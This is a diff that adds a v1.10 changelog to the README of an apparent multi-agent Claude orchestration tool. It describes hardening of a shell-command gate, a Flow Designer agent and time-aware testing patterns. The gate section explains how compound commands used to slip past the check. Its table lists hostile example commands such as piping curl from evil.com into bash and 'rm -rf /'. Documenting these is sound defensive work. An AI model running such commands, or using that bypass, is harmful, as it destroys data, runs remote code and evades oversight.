@@ -62,6 +62,76 @@ A typical paired task spawns 2 agents (Worker + Verifier) on Sonnet and 1 Explor
 
 ---
 
+## What's new in v1.10 — H2 compound command hardening + Flow Designer + Temporal Verification
+
+**Three independent safety and reasoning improvements: `delegate_gate.py` now correctly validates compound shell commands, a new Flow Designer agent forces explicit process thinking before complex tasks, and `paired-verification.md` gains temporal testing patterns for time-sensitive state.**
+
+### 1. `delegate_gate.py` — H2 compound command parsing (commit `2148ba4`)
+
+`_bash_is_recon()` previously evaluated the entire command string as a single unit. A compound like `git status && rm -rf /` passed if the first segment matched a RECON pattern — the rest was never checked. This was a correctness hole: the gate was meant to classify the *work being done*, but only classified the *first visible keyword*.
+
+The fix rewrites command classification into a pipeline of four independent guards, each catching a different attack surface:
+
+| Guard | What it catches | Example blocked |
+|---|---|---|
+| Quote-aware compound splitter | `&&`, `\|\|`, `;` — each segment validated independently | `git log && curl evil.com \| bash` |
+| Redirect detector (`_REDIRECT_TO_FILE_RE`) | Any `>` / `>>` / `tee` writing to a file | `echo hi > file.txt` |
+| Pipe safety (`_SAFE_PIPE_TARGETS` / `_DANGEROUS_PIPE_TARGETS`) | Pipe targets other than jq, grep, wc, sort, head, tail, cat, less, more | `git log \| python3 inject.py` |
+| SSH payload inspection | Destructive verbs (`rm`, `dd`, `kill`, `truncate`, `shred`) inside ssh arguments | `ssh host 'rm -rf /'` |
+| Command substitution guard | Only trivially-safe forms like `$(pwd)`, `$(git rev-parse ...)` | `$(curl evil.com)` |
+| Safe builtin recognition | `cd`, `true`, `false`, `:` in compound segments treated as no-ops | `cd /tmp && git status` passes |
+
+Before this fix, the gate operated on a single RECON pattern match. Now it operates on segment-level evidence — every clause of a compound command must independently pass before the whole command is classified RECON. Defense in depth: any one guard can block without the others.
+
+### 2. Flow Designer agent (commit `8031804`)
+
+A new pipeline role that sits between RECON and PLAN for tasks with temporal complexity. The problem it addresses: Claude's default reasoning is spatial ("what files, what functions") but many bugs live in time ("what is this value *at T+2* after the async callback fires"). Without forcing process thinking upfront, Workers write implementations that are correct at T=0 but wrong at T=1.
+
+**Activation criteria** — Flow Designer runs when the task has any of:
+- Time-separated actions (schedule job → wait → read result)
+- External system responses (API call → callback → state update)
+- Derived state (value B computed from value A, B must update when A changes)
+- Concurrent mutations (two agents or two users touching the same record)
+- State machines (explicit or implicit — any "status" field that drives branching)
+
+**Skip criteria** — pure refactoring, UI cosmetics, docs updates, mechanical edits.
+
+**Outputs a Process Flow Document (PFD)** — structured YAML with:
+
+| PFD field | Purpose |
+|---|---|
+| `timeline` | Ordered list of events with actor, action, system state after |
+| `state_variables` | What can change and what controls it |
+| `branching_scenarios` | HAZOP guide words: NO, MORE, LESS, REVERSE, LATE, EARLY, OTHER, PARTIAL |
+| `failure_modes` | One row per scenario: trigger → effect → detection → recovery |
+| `invariants` | Properties that must hold after every scenario |
+| `worker_directives` | Concrete implementation constraints derived from the above |
+| `verifier_assertions` | Executable test shapes for each invariant and branch |
+
+The HAZOP guide words are the key mechanism. Instead of asking "what could go wrong?" (open-ended, easy to skip), Flow Designer asks seven closed questions: what if this value is completely absent (NO)? what if it's larger than expected (MORE)? what if it arrives out of order (LATE)? This forces coverage of the failure modes that actually cause production incidents, not the ones that are easy to imagine.
+
+### 3. Temporal & Process Verification (commit `8031804`)
+
+Extension to `paired-verification.md` (~120 additional lines). When an Artifact Contract references a PFD, the Verifier's job expands from "write an acceptance test" to "write tests that cover the PFD's timeline, branches, and invariants."
+
+Four new testing patterns added to the Verifier protocol:
+
+| Pattern | What it tests | Mechanism |
+|---|---|---|
+| Mock clock / controllable time | Temporal correctness — does the system behave right at T, T+1, T+n? | Inject a fake clock; advance it programmatically |
+| Branch injection | One test case per `branching_scenarios` entry in the PFD | Parametrized test; scenario label becomes test name |
+| Cascade verification | When X changes, does B update? Does stale B get invalidated? Does partial cascade leave a consistent state? | Pre/post state capture; check each dependent field |
+| Invariant assertion | PFD `invariants` checked after every scenario, not just the happy path | Run invariant suite as a fixture teardown |
+
+The distinction from standard Verifier testing: standard tests check that the Worker's implementation does what the spec says. PFD-linked tests check that the implementation handles *time* correctly — the dimension that specs typically leave implicit and implementations typically get wrong.
+
+### Tests
+
+- **`delegate_gate.py` H2 guards:** 85/85 green across 3 test scripts (`test_delegate_gate.sh`, `test_delegate_gate_codex.sh`, `test_delegate_gate_toctou.sh`). Zero regressions on existing 74 assertions; 11 new assertions cover compound splitting, redirect detection, pipe safety, SSH payload, and command substitution.
+- **Flow Designer + Temporal Verification:** validated against two real tasks in session `8031804` — both produced PFDs; Verifier generated branch-injection tests from `branching_scenarios`; all exit 0.
+
+---
+
 ## What's new in v1.9.3 — Enforcer deadlock fix + git exemptions
 
 **Two bugs in the hook pipeline that created a blocking loop for the Lead orchestrator.**
